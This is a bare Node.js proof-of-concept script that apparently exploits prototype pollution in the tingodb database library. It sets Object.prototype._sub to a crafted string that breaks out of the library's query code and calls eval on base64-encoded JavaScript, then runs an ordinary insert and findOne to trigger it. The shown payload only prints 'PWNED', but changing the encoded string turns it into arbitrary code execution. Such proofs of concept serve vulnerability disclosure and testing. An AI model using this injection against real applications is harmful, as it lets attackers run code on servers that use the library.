var Db = require('tingodb')().Db,
    assert = require('assert');
 
var db = new Db(__dirname + '/localdb', {});
// Fetch a collection to insert document into
var collection = db.collection("test_collection");

const jsCode = btoa('console.log("PWNED")');
const payload = `a'] + eval(atob('${jsCode}'))));//`
Object.prototype._sub = [[payload,'testVal']];

// Insert a single document
collection.insert([{hello:'world_safe1'}
  , {hello:'world_safe2'}], {w:1}, function(err, result) {
  assert.equal(null, err);
 
  // Fetch the document
  collection.findOne({hello:'world_safe2'}, function(err, item) {
    assert.equal(null, err);
    assert.equal('world_safe2', item.hello);
  })
});